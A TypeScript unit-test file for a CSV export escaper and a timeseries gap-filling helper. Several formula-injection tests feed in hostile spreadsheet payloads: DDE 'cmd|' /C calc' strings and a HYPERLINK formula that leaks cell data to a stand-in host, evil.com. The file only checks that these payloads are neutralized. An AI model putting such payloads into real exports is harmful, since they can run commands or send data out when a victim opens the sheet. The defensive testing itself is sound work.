/**
 * Unit tests for Campaign CSV Export & Timeseries Helpers
 * Imports the real utilities from backend/src/utils/ to ensure 100% genuine validation.
 */

import {
  escapeCsvCell,
  generateCsvRow,
  generateCsv
} from "../../../backend/src/utils/csvHelper";

import {
  fillTimeseriesGaps,
  getStartOfWeekUtc,
  TimeseriesEvent
} from "../../../backend/src/utils/timeseriesHelper";

describe("1. Real CSV Escaping Helper & Formula Injection Neutralization", () => {
  test("returns unchanged string for plain text without special characters", () => {
    expect(escapeCsvCell("Q4 High Voltage Campaign")).toBe("Q4 High Voltage Campaign");
    expect(escapeCsvCell("GOOGLE-SEARCH-2026")).toBe("GOOGLE-SEARCH-2026");
  });

  test("handles null and undefined values by returning empty string", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  test("formats numeric values correctly as raw numbers with no guards", () => {
    expect(escapeCsvCell(50000)).toBe("50000");
    expect(escapeCsvCell(-150.75)).toBe("-150.75");
    expect(escapeCsvCell(0)).toBe("0");
    expect(escapeCsvCell(3.25)).toBe("3.25");
  });

  test("escapes cells containing commas by wrapping in double quotes", () => {
    expect(escapeCsvCell("Riyadh, Saudi Arabia")).toBe('"Riyadh, Saudi Arabia"');
    expect(escapeCsvCell("Electronics, Power & Utilities, Construction")).toBe(
      '"Electronics, Power & Utilities, Construction"'
    );
  });

  test("escapes cells containing newlines by wrapping in double quotes", () => {
    expect(escapeCsvCell("Line 1\nLine 2")).toBe('"Line 1\nLine 2"');
    expect(escapeCsvCell("Row 1\r\nRow 2")).toBe('"Row 1\r\nRow 2"');
  });

  test("escapes internal double quotes by doubling them and wrapping in quotes", () => {
    expect(escapeCsvCell('He said "Hello"')).toBe('"He said ""Hello"""');
    expect(escapeCsvCell('32" Commercial Display')).toBe('"32"" Commercial Display"');
  });

  describe("Formula Injection Neutralization vs. Safe Numbers / Phone Numbers", () => {
    test("preserves international phone numbers starting with '+' without prefixing (+966500000001)", () => {
      expect(escapeCsvCell("+966500000001")).toBe("+966500000001");
      expect(escapeCsvCell("+1 (555) 234-5678")).toBe("+1 (555) 234-5678");
      expect(escapeCsvCell("+971-50-1234567")).toBe("+971-50-1234567");
    });

    test("preserves plain negative numbers starting with '-' without prefixing (-35.5)", () => {
      expect(escapeCsvCell("-35.5")).toBe("-35.5");
      expect(escapeCsvCell("-100")).toBe("-100");
      expect(escapeCsvCell("-0.05")).toBe("-0.05");
    });

    test("always prefixes cells starting with '=' (=1+1 -> '=1+1)", () => {
      expect(escapeCsvCell("=1+1")).toBe("'=1+1");
      expect(escapeCsvCell("=SUM(A1:A5)")).toBe("'=SUM(A1:A5)");
    });

    test("always prefixes cells starting with '@' (@SUM(A1) -> '@SUM(A1))", () => {
      expect(escapeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
      expect(escapeCsvCell("@SUM(B1:B10)")).toBe("'@SUM(B1:B10)");
    });

    test("prefixes malicious commands starting with '+' (+cmd|' /C calc'!A0 -> '+cmd|' /C calc'!A0)", () => {
      expect(escapeCsvCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
      expect(escapeCsvCell("+123+456")).toBe("'+123+456");
    });

    test("prefixes formula expressions starting with '-' (-2+3 -> '-2+3)", () => {
      expect(escapeCsvCell("-2+3")).toBe("'-2+3");
      expect(escapeCsvCell("-cmd|' /C calc'!A0")).toBe("'-cmd|' /C calc'!A0");
    });

    test("neutralizes cells starting with tab or carriage return", () => {
      expect(escapeCsvCell("\t=1+1")).toBe("'\t=1+1");
      const crResult = escapeCsvCell("\r=1+1");
      expect(crResult).toContain("'\r=1+1");
    });

    test("neutralizes complex malicious formula payloads with commas and quotes", () => {
      const payload = '=HYPERLINK("http://evil.com/leak?data="&A1,"Click here")';
      const escaped = escapeCsvCell(payload);
      expect(escaped).toBe('"\'=HYPERLINK(""http://evil.com/leak?data=""&A1,""Click here"")"');
    });
  });

  describe("generateCsvRow & generateCsv with Numeric Columns", () => {
    test("properly formats a full CSV row with phone numbers, numeric metrics, and text", () => {
      const row = [
        "LEAD-001",
        "Ahmed Al-Otaibi",
        "Al-Noor Industrial, LLC",
        "ahmed@alnoor.com",
        "+966500000001",
        "QUALIFIED",
        50000,
        -35.5,
        "=1+1"
      ];
      const csvRow = generateCsvRow(row);
      expect(csvRow).toBe(
        'LEAD-001,Ahmed Al-Otaibi,"Al-Noor Industrial, LLC",ahmed@alnoor.com,+966500000001,QUALIFIED,50000,-35.5,\'=1+1'
      );
    });

    test("generates complete multi-line CSV with headers and data", () => {
      const headers = ["name", "code", "budget", "spend", "roas"];
      const rows = [
        ["Campaign A", "CAMP-A", 10000, 8000, 4.5],
        ["Campaign B", "CAMP-B", 20000, -250.5, 0]
      ];
      const csv = generateCsv(headers, rows);
      const lines = csv.split("\n");
      expect(lines.length).toBe(3);
      expect(lines[0]).toBe("name,code,budget,spend,roas");
      expect(lines[1]).toBe("Campaign A,CAMP-A,10000,8000,4.5");
      expect(lines[2]).toBe("Campaign B,CAMP-B,20000,-250.5,0");
    });
  });
});

describe("2. Real Timeseries Gap-Filling Helper", () => {
  test("computes UTC start of week (Monday) consistently", () => {
    // 2026-09-28 is a Monday
    const monday = new Date(Date.UTC(2026, 8, 28));
    expect(getStartOfWeekUtc(monday).toISOString().slice(0, 10)).toBe("2026-09-28");

    // 2026-09-30 is a Wednesday -> Monday should be 2026-09-28
    const wednesday = new Date(Date.UTC(2026, 8, 30));
    expect(getStartOfWeekUtc(wednesday).toISOString().slice(0, 10)).toBe("2026-09-28");

    // 2026-10-04 is a Sunday -> Monday should be 2026-09-28
    const sunday = new Date(Date.UTC(2026, 9, 4));
    expect(getStartOfWeekUtc(sunday).toISOString().slice(0, 10)).toBe("2026-09-28");
  });

  test("fills daily periods with 0 for all gaps between start and end dates", () => {
    const events: TimeseriesEvent[] = [
      { date: "2026-09-01T10:00:00Z", type: "lead" },
      { date: "2026-09-05T14:30:00Z", type: "lead" }
    ];

    const result = fillTimeseriesGaps(events, "day", "2026-09-01", "2026-09-05");

    // 5 continuous days: 09-01, 09-02, 09-03, 09-04, 09-05
    expect(result.length).toBe(5);
    expect(result.map((b) => b.period)).toEqual([
      "2026-09-01",
      "2026-09-02",
      "2026-09-03",
      "2026-09-04",
      "2026-09-05"
    ]);

    expect(result[0].leads).toBe(1); // 2026-09-01
    expect(result[1].leads).toBe(0); // 2026-09-02 gap
    expect(result[2].leads).toBe(0); // 2026-09-03 gap
    expect(result[3].leads).toBe(0); // 2026-09-04 gap
    expect(result[4].leads).toBe(1); // 2026-09-05
  });

  test("aggregates multiple events on the same day correctly across leads, opportunities, and wonOrders", () => {
    const events: TimeseriesEvent[] = [
      { date: "2026-09-15T08:00:00Z", type: "lead" },
      { date: "2026-09-15T11:00:00Z", type: "lead" },
      { date: "2026-09-15T15:00:00Z", type: "opportunity" },
      { date: "2026-09-15T17:00:00Z", type: "wonOrder" },
      { date: "2026-09-16T09:00:00Z", type: "opportunity" }
    ];

    const result = fillTimeseriesGaps(events, "day", "2026-09-15", "2026-09-16");

    expect(result.length).toBe(2);
    const day1 = result.find((b) => b.period === "2026-09-15");
    expect(day1).toBeDefined();
    expect(day1?.leads).toBe(2);
    expect(day1?.opportunities).toBe(1);
    expect(day1?.wonOrders).toBe(1);

    const day2 = result.find((b) => b.period === "2026-09-16");
    expect(day2).toBeDefined();
    expect(day2?.leads).toBe(0);
    expect(day2?.opportunities).toBe(1);
    expect(day2?.wonOrders).toBe(0);
  });

  test("handles weekly granularity with gap-filling", () => {
    // 2026-09-07 is Monday, 2026-09-21 is Monday 2 weeks later
    const events: TimeseriesEvent[] = [
      { date: "2026-09-08T10:00:00Z", type: "lead" }, // Belongs to week 2026-09-07
      { date: "2026-09-22T10:00:00Z", type: "opportunity" } // Belongs to week 2026-09-21
    ];

    const result = fillTimeseriesGaps(events, "week", "2026-09-07", "2026-09-21");

    // 3 weeks: 2026-09-07, 2026-09-14, 2026-09-21
    expect(result.length).toBe(3);
    expect(result.map((b) => b.period)).toEqual([
      "2026-09-07",
      "2026-09-14",
      "2026-09-21"
    ]);

    expect(result[0].leads).toBe(1);
    expect(result[0].opportunities).toBe(0);

    // Intermediate week has 0
    expect(result[1].leads).toBe(0);
    expect(result[1].opportunities).toBe(0);

    expect(result[2].leads).toBe(0);
    expect(result[2].opportunities).toBe(1);
  });

  test("handles empty events array by filling all buckets with 0", () => {
    const result = fillTimeseriesGaps([], "day", "2026-09-20", "2026-09-23");
    expect(result.length).toBe(4);
    result.forEach((bucket) => {
      expect(bucket.leads).toBe(0);
      expect(bucket.opportunities).toBe(0);
      expect(bucket.wonOrders).toBe(0);
    });
  });
});
